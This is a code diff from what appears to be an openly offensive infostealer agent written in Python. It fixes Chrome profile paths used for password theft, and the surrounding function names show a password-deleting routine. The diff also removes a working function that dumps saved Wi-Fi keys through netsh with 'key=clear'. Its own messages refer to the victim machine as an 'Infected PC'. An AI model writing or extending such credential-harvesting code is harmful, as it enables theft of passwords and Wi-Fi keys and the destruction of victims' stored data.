@@ -187,9 +187,10 @@ def getPath():
                '\\Google\\Chrome\\User Data\\Default\\'
     elif os.name == 'posix':
         path = os.getenv('HOME')
-        if platform.system() == 'darwin':  # MacOS
-            path += 'Library/Application Support/Google/Chrome/Default'
+        if platform.system().lower() == 'darwin':  # MacOS
+            path += '/Library/Application Support/Google/Chrome/Default'
         else:  # Linux
+            print(platform.system())
             path += '/.config/google-chrome/Default/'
 
     return path
@@ -230,36 +231,16 @@ def deleteChromePasswords():
     os.remove(path)
     return
 
-def getWifiPasswords():
-    if os.name == 'nt':
-        try:
-            data_list = []
-            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
-            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
-
-            for i in profiles:
-                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(
-                        'utf-8').split('\n')
-                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
-                try:
-                    data_list.append("{:<30}|  {:<}".format(i, results[0]))
-                except Exception:
-                    data_list.append("{:<30}|  {:<}".format(i, ""))
-
-            return data_list
-        except Exception as e:
-            return ["getWifiPasswords failed with exception " + str(e)]
-    else:
-        return ['Infected PC is not Windows based, so cannot fetch wifi data for now.']
 
 def getFirefoxPasswords():
     # TODO: getFirefoxPasswords() and create command in agent.py
     return [{'TODO': 'getFirefoxPasswords'}]
 
 if __name__ == '__main__':
-    dict_obj = get_browserhistory()
-    print(dict_obj)
+    #dict_obj = get_browserhistory()
+    #print(dict_obj)
+
+    print(getPath())
 
     print(getChromePasswords())
-    print(getFirefoxPasswords())
-    print(getWifiPasswords())
+    #print(getFirefoxPasswords())
